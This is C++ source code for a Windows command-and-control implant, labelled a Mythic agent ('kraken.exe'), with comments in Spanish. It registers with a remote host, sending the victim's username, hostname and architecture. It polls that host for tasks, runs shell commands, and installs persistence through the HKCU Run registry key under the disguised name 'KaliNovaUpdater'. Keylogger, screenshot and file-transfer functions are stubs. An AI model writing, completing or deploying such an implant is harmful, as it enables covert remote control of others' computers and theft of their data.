#include <iostream>
#include <string>
#include <vector>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <windows.h>

using json = nlohmann::json;

class MythicAgent {
private:
    std::string callback_url;
    std::string agent_id;
    std::string encryption_key;
    int sleep_seconds;
    
public:
    MythicAgent(const std::string& host, int port) {
        callback_url = "http://" + host + ":" + std::to_string(port) + "/api/v1.4/";
        sleep_seconds = 5;
        agent_id = generate_agent_id();
    }
    
    std::string generate_agent_id() {
        // Generar ID único para el agente
        char id[37];
        GUID guid;
        CoCreateGuid(&guid);
        sprintf(id, "%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X",
                guid.Data1, guid.Data2, guid.Data3,
                guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
                guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
        return std::string(id);
    }
    
    void register_agent() {
        json register_data = {
            {"action", "register"},
            {"id", agent_id},
            {"os", get_os_info()},
            {"user", get_username()},
            {"host", get_hostname()},
            {"architecture", get_architecture()}
        };
        
        auto response = cpr::Post(cpr::Url{callback_url + "agent"},
                                  cpr::Body{register_data.dump()},
                                  cpr::Header{{"Content-Type", "application/json"}});
        
        if (response.status_code == 200) {
            std::cout << "[+] Agent registered successfully" << std::endl;
        }
    }
    
    void checkin() {
        json checkin_data = {
            {"action", "checkin"},
            {"id", agent_id}
        };
        
        auto response = cpr::Post(cpr::Url{callback_url + "checkin"},
                                  cpr::Body{checkin_data.dump()},
                                  cpr::Header{{"Content-Type", "application/json"}});
        
        if (response.status_code == 200) {
            auto tasks = json::parse(response.text);
            process_tasks(tasks);
        }
    }
    
    void process_tasks(const json& tasks) {
        for (const auto& task : tasks["tasks"]) {
            std::string command = task["command"];
            std::string task_id = task["id"];
            
            std::cout << "[*] Executing task: " << command << std::endl;
            
            std::string result = execute_command(command);
            
            post_results(task_id, result);
        }
    }
    
    std::string execute_command(const std::string& command) {
        if (command == "shell") {
            return execute_shell_command();
        } else if (command == "download") {
            return download_file();
        } else if (command == "upload") {
            return upload_file();
        } else if (command == "persist") {
            return install_persistence();
        } else if (command == "screenshot") {
            return take_screenshot();
        } else if (command == "keylog") {
            return start_keylogger();
        }
        
        return "Command not implemented";
    }
    
    std::string execute_shell_command() {
        char buffer[4096];
        std::string result;
        
        FILE* pipe = popen("cmd.exe /c whoami", "r");
        if (!pipe) return "Error executing command";
        
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
        
        pclose(pipe);
        return result;
    }
    
    std::string download_file() {
        // Implementar descarga de archivos
        return "File downloaded";
    }
    
    std::string upload_file() {
        // Implementar subida de archivos
        return "File uploaded";
    }
    
    std::string install_persistence() {
        // Instalar persistencia en registro
        HKEY hKey;
        const char* path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            char exe_path[MAX_PATH];
            GetModuleFileNameA(NULL, exe_path, MAX_PATH);
            RegSetValueExA(hKey, "KaliNovaUpdater", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path));
            RegCloseKey(hKey);
            return "Persistence installed successfully";
        }
        
        return "Failed to install persistence";
    }
    
    std::string take_screenshot() {
        // Implementar captura de pantalla
        return "Screenshot captured";
    }
    
    std::string start_keylogger() {
        // Implementar keylogger
        return "Keylogger started";
    }
    
    std::string get_os_info() {
        // Obtener información del SO
        return "Windows 10";
    }
    
    std::string get_username() {
        char username[256];
        DWORD size = sizeof(username);
        GetUserNameA(username, &size);
        return std::string(username);
    }
    
    std::string get_hostname() {
        char hostname[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        return std::string(hostname);
    }
    
    std::string get_architecture() {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        return si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86";
    }
    
    void run() {
        register_agent();
        
        while (true) {
            checkin();
            Sleep(sleep_seconds * 1000);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: kraken.exe <host> <port>" << std::endl;
        return 1;
    }
    
    MythicAgent agent(argv[1], atoi(argv[2]));
    agent.run();
    
    return 0;
}